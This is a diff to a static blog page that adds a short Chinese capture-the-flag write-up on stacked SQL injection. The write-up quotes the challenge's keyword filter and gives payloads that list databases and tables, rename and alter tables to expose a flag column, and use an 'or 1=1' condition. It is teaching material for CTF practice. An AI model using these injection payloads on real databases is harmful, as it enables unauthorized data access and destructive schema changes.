@@ -115,7 +115,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/1/" style="font-size: 10px;">1</a> <a href="/tags/2/" style="font-size: 10px;">2</a> <a href="/tags/3/" style="font-size: 10px;">3</a>
+						<a href="/tags/1/" style="font-size: 10px;">1</a> <a href="/tags/2/" style="font-size: 10px;">2</a> <a href="/tags/3/" style="font-size: 10px;">3</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">堆叠注入</a>
 					</div>
 				</section>
 				
@@ -170,6 +170,68 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-sql1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/01/12/sql1/" class="article-date">
+  	<time datetime="2020-01-12T13:54:26.000Z" itemprop="datePublished">2020-01-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/01/12/sql1/">
+        sql1
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);过滤了括号内的东西<br>?a=1#返回正常<br>堆叠查询 id=1’;show databases;’爆出数据库内容<br>id=1’;show tables;’爆出所有表名</p>
+<p>因为alert,rename没有被过滤，可以改变表名</p>
+<p>/?inject=1’;RENAME TABLE <code>words</code> TO <code>words1</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</p>
+<p>最后直接通过i’or’1’=’1可以爆出flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" rel="tag">堆叠注入</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-diary3" class="article article-type-post" itemscope itemprop="blogPost">
   
